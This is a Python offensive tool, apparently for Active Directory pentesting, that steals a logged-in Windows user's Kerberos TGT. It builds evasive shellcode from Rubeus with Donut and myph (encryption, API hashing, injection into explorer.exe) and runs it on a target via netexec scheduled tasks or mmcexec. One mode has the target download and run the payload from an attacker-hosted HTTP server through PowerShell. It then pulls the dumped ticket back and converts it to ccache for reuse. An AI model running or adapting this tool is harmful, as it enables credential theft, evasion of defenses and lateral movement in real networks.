#!/usr/bin/env python3
"""
Uso normal (usuario objetivo administrador):
    ./HarpyTGT.py -t 192.168.1.22 -u jesus -p Admin123 -U jmartinez -r /opt/Rubeus.exe
Uso cuando el usuario objetivo NO es admin:
    ./harpyTGT.py -t 192.168.1.22 -u jesus -p Admin123 -U jmartinez -r /opt/Rubeus.exe --no-target-admin --attacker-ip 192.168.1.3
"""

import argparse, subprocess, sys, os, re, base64, time, random, string, threading, http.server, socketserver, socket
from datetime import datetime

# Colores semánticos
CYAN = '\033[36m'
YELLOW = '\033[33m'
PURPLE = '\033[35m'
GREEN = '\033[32m'
RED = '\033[31m'
GRAY = '\033[90m'
WHITE_BOLD = '\033[1;37m'
NC = '\033[0m'

def timestamp():
    return datetime.now().strftime("[%H:%M:%S]")

def log(tag, message, color=None):
    colors = {
        'INFO': CYAN,
        'STEP': YELLOW,
        'WAIT': PURPLE,
        'SUCCESS': GREEN,
        'ERROR': RED
    }
    c = color if color else colors.get(tag, NC)
    print(f"{GRAY}{timestamp()}{NC} {c}[{tag}]{NC} {message}")

def random_name(prefix='', ext='', length=8):
    chars = string.ascii_letters + string.digits
    rand = ''.join(random.choices(chars, k=length))
    name = f"{prefix}{rand}" if prefix else rand
    return f"{name}.{ext}" if ext else name

def check_tool(tool):
    if subprocess.call(['which', tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
        log('ERROR', f'{tool} no encontrado.')
        sys.exit(1)

def run(cmd, exit_on_fail=True, capture=False, verbose=False):
    if verbose:
        log('INFO', f"Executing: {' '.join(cmd)}")
    try:
        if capture:
            res = subprocess.run(cmd, check=exit_on_fail, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return res.stdout
        else:
            if verbose:
                subprocess.run(cmd, check=exit_on_fail)
            else:
                subprocess.run(cmd, check=exit_on_fail, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        log('ERROR', f"Falló la ejecución: {' '.join(cmd)}")
        if exit_on_fail:
            sys.exit(1)
        return None

def start_http_server(port, directory, bind_ip):
    """Inicia un servidor HTTP en un hilo y devuelve el objeto del servidor."""
    os.chdir(directory)
    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer((bind_ip, port), handler)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    return httpd

def main():
    parser = argparse.ArgumentParser(description='Extrae TGT de un usuario logueado en Windows.')
    parser.add_argument('-t', '--target-ip', required=True, help='IP del objetivo')
    parser.add_argument('-u', '--local-user', required=True, help='Usuario admin local')
    parser.add_argument('-p', '--local-pass', required=True, help='Contraseña admin local')
    parser.add_argument('-U', '--target-user', required=True, help='Usuario a robar TGT')
    parser.add_argument('-r', '--rubeus-path', required=True, help='Ruta a Rubeus.exe local')
    parser.add_argument('-v', '--verbose', action='store_true', help='Salida detallada de herramientas')
    parser.add_argument('--no-target-admin', action='store_true', help='Si el usuario objetivo NO es administrador (usa mmcexec + descarga HTTP)')
    parser.add_argument('--attacker-ip', help='IP del atacante para la descarga HTTP (obligatorio con --no-target-admin)')
    args = parser.parse_args()

    # Validaciones
    for tool in ['donut', 'myph', 'netexec', 'impacket-ticketConverter', 'base64', 'awk']:
        check_tool(tool)

    if not os.path.isfile(args.rubeus_path):
        log('ERROR', f'No se encuentra {args.rubeus_path}')
        sys.exit(1)

    if args.no_target_admin and not args.attacker_ip:
        log('ERROR', 'Se requiere --attacker-ip cuando se usa --no-target-admin')
        sys.exit(1)

    # Nombres aleatorios
    shellcode_bin = random_name(ext='bin')
    rubeus_exe = random_name(ext='exe')
    remote_out = random_name(ext='txt')
    remote_exe_name = rubeus_exe
    dump_file = random_name(ext='txt')
    ticket_b64_file = random_name(ext='b64')
    kirbi_file = f'{args.target_user}.kirbi'
    ccache_file = f'{args.target_user}.ccache'

    remote_temp = 'C:\\Windows\\Temp'
    remote_out_full = f'{remote_temp}\\{remote_out}'

    for f in [shellcode_bin, rubeus_exe, dump_file, ticket_b64_file]:
        if os.path.exists(f):
            os.remove(f)

    # ─── CUADRO DE PARÁMETROS ─────────────────
    params = {
        'Target IP': args.target_ip,
        'Admin User': args.local_user,
        'Admin Pass': '****',
        'Target User': args.target_user,
        'Rubeus Path': args.rubeus_path,
        'Verbose': 'Yes' if args.verbose else 'No',
        'Mode': 'Alternative (HTTP + mmcexec)' if args.no_target_admin else 'Direct (schtask_as)'
    }
    max_label = max(len(k) for k in params)
    print(f"\n{GRAY}{'─'*55}{NC}")
    print(f"{WHITE_BOLD}  ATTACK PARAMETERS{NC}")
    for label, value in params.items():
        print(f"  {label.ljust(max_label)} : {value}")
    print(f"{GRAY}{'─'*55}{NC}\n")

    # ─── PHASE 1: GENERACIÓN DE ARTEFACTOS ───
    log('STEP', 'Generating shellcode via Donut...')
    run(['donut', '-i', args.rubeus_path, '-a', '2', '-e', '3', '-z', '1', '-b', '3', '-k', '1',
         '-p', f'dump /user:{args.target_user} /nowrap /consoleoutfile:{remote_out_full}',
         '-o', shellcode_bin], verbose=args.verbose)
    log('SUCCESS', f'Shellcode successfully created: {shellcode_bin}')

    log('STEP', 'Obfuscating and compiling binary via myph...')
    run(['myph', '--shellcode', shellcode_bin, '--out', rubeus_exe[:-4],
         '--process', 'explorer.exe', '--encryption', 'chacha20',
         '--sleep-time', '15', '--use-api-hashing'], verbose=args.verbose)
    if not os.path.isfile(rubeus_exe):
        log('ERROR', f'myph no generó {rubeus_exe}')
        sys.exit(1)
    log('SUCCESS', f'Evasive executable ready: {rubeus_exe}')

    # ─── PHASE 2: EJECUCIÓN ───
    if args.no_target_admin:
        # Modo alternativo: descarga HTTP y ejecución con mmcexec
        log('STEP', f'Starting temporary HTTP server on {args.attacker_ip}...')
        http_port = random.randint(1024, 65535)
        server_dir = os.getcwd()
        httpd = start_http_server(http_port, server_dir, args.attacker_ip)
        log('SUCCESS', f'HTTP server listening on {args.attacker_ip}:{http_port}')
        log('STEP', f'Uploading and executing {rubeus_exe} via mmcexec...')
        download_cmd = f"powershell -c iwr http://{args.attacker_ip}:{http_port}/{rubeus_exe} -OutFile C:\\Users\\Public\\{rubeus_exe}"
        exec_cmd = f" & C:\\Users\\Public\\{rubeus_exe}"
        full_cmd = download_cmd + "; " + exec_cmd
        run(['netexec', 'smb', args.target_ip,
             '-u', args.local_user, '-p', args.local_pass, '--local-auth',
             '--exec-method', 'mmcexec',
             '-X', full_cmd], verbose=args.verbose)
        log('WAIT', 'Waiting 30 seconds for execution and dump...')
        time.sleep(30)
        # Apagar servidor HTTP
        httpd.shutdown()
        log('SUCCESS', 'HTTP server stopped.')
    else:
        # Modo original: schtask_as
        log('STEP', f'Executing {rubeus_exe} on target as \'{args.target_user}\'...')
        run(['netexec', 'smb', args.target_ip,
             '-u', args.local_user, '-p', args.local_pass, '--local-auth',
             '-M', 'schtask_as',
             '-o', f'USER={args.target_user}', f'CMD={remote_exe_name}', f'BINARY={rubeus_exe}'],
            verbose=args.verbose)
        log('WAIT', 'Task spawned. Waiting 20 seconds for sync...')
        time.sleep(20)

    # ─── RECUPERAR SALIDA ───
    log('STEP', 'Downloading output artifact...')
    raw_output = run(['netexec', 'smb', args.target_ip,
                      '-u', args.local_user, '-p', args.local_pass, '--local-auth',
                      '-X', f'type {remote_out_full}'],
                     capture=True, verbose=args.verbose)
    if not raw_output or not raw_output.strip():
        log('ERROR', 'No se obtuvo salida.')
        sys.exit(1)

    with open(dump_file, 'w', encoding='utf-8') as f:
        f.write(raw_output)
    size_kb = len(raw_output) / 1024
    log('SUCCESS', f'Remote dump saved: {dump_file} ({size_kb:.1f} KB)')

    # ─── PHASE 3: PROCESAMIENTO DE CREDENCIALES ───
    log('STEP', 'Extracting Base64 TGT via awk...')
    awk_script = r"""
    {
        sub(/^SMB\s+[0-9.]+\s+[0-9]+\s+\S+\s+/, "")
    }
    /ServiceName *: *krbtgt\/SECURE.LOCAL/ { found=1 }
    found && /Base64EncodedTicket *:/ { printing=1; next }
    printing && /^ServiceName/ { exit }
    printing { printf "%s", $0 }
    """
    try:
        ticket_b64 = subprocess.check_output(
            ['awk', awk_script, dump_file],
            stderr=subprocess.STDOUT, text=True
        ).strip()
    except subprocess.CalledProcessError as e:
        log('ERROR', f'awk falló: {e.output}')
        sys.exit(1)

    if not ticket_b64:
        log('ERROR', f'No se encontró TGT para {args.target_user}.')
        sys.exit(1)

    with open(ticket_b64_file, 'w') as f:
        f.write(ticket_b64)
    log('SUCCESS', f'TGT successfully extracted ({len(ticket_b64)} chars)')

    log('STEP', 'Converting format: Kirbi -> ccache...')
    try:
        kirbi_data = base64.b64decode(ticket_b64)
        with open(kirbi_file, 'wb') as f:
            f.write(kirbi_data)
    except Exception as e:
        log('ERROR', f'Error decodificando base64: {e}')
        sys.exit(1)
    run(['impacket-ticketConverter', kirbi_file, ccache_file], verbose=args.verbose)
    log('SUCCESS', f'Final ticket generated: {ccache_file}')

    # ─── BLOQUE FINAL ─────────────────────────
    print(f"\n{GRAY}{'='*60}{NC}")
    print(f"{WHITE_BOLD}  To load the ticket into your current session, run:{NC}")
    print(f"{WHITE_BOLD}  export KRB5CCNAME=$(pwd)/{ccache_file}{NC}")
    print(f"{WHITE_BOLD}  klist{NC}")
    print(f"{GRAY}{'='*60}{NC}\n")
    log('SUCCESS', 'TGT ACQUISITION COMPLETE')

if __name__ == '__main__':
    main()